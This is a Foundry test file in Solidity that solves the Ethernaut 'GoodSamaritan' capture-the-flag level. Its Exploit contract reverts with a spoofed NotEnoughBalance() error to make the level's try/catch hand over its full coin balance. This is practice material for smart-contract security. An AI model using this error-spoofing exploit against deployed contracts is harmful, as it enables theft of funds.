// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {GoodSamaritan, INotifyable} from "../../src/27/GoodSamaritan.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {GoodSamaritanFactory} from "src/27/GoodSamaritanFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract GoodSamaritanTest is Test, BaseTest {
    GoodSamaritan public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new GoodSamaritanFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = GoodSamaritan(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // Create a contract that reverts with the error = NotEnoughBalance() when it calls notify function.
        // What's important to note is that when a try/catch statement catches an exception, all state changes made by the try block are reverted and the context will be preserved as it was before the call.
        Exploit hack = new Exploit(instanceContract);

        hack.emptyGoodSamaritan();

        // DONE !

        vm.stopPrank();
    }
}

contract Exploit {
    error NotEnoughBalance();

    GoodSamaritan goodSamaritan;
    uint256 counter;

    constructor(GoodSamaritan _goodSamaritan) {
        goodSamaritan = _goodSamaritan;
    }

    function notify(uint256 amount) external {
        // Depending on the amount revert or not
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function emptyGoodSamaritan() external {
        goodSamaritan.requestDonation();
    }
}
